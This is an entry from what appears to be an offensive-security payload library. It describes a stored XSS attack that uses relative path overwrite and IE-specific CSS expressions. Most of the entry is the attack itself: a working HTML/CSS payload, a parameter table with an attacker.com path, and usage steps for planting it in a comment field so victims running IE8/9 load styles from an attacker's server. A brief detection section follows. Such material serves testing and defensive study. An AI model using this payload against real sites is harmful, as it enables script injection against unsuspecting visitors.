---
id: 01877d42-e64d-4a2a-b2ae-d01021600fc3
name: IE-CSS-Injection-XSS-Payload
type: code
language: html
verified: true
created_at: '2023-04-06T03:56:43.832647+00:00'
updated_at: '2023-04-06T03:56:43.856974+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - rpo
validated: true
---

# IE-CSS-Injection-XSS-Payload

## Code

```html
http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css" />
</head>
<body>
Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
</body>
</html>
```

## Description

This HTML payload exploits RPO by overwriting a relative CSS link to load malicious styles, using IE-specific CSS expressions to execute JavaScript like an alert.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [RELATIVE_URL_INSERTED_HERE] | Placeholder for relative path to manipulate | ../attacker.com/malicious |

## Usage

Inject into a stored input field (e.g., comment) on a vulnerable site. When a victim in IE8/9 loads the page, the CSS loads from attacker server, executing the expression.

## Detection

- Monitor for anomalous CSS loads from external domains.
- Enable CSP to block expressions and inline styles.
- Log user inputs containing path traversals like ../.

## Related

- [[procedures/Exploit-RPO-for-Stored-XSS-via-CSS-Injection-in-IE]]
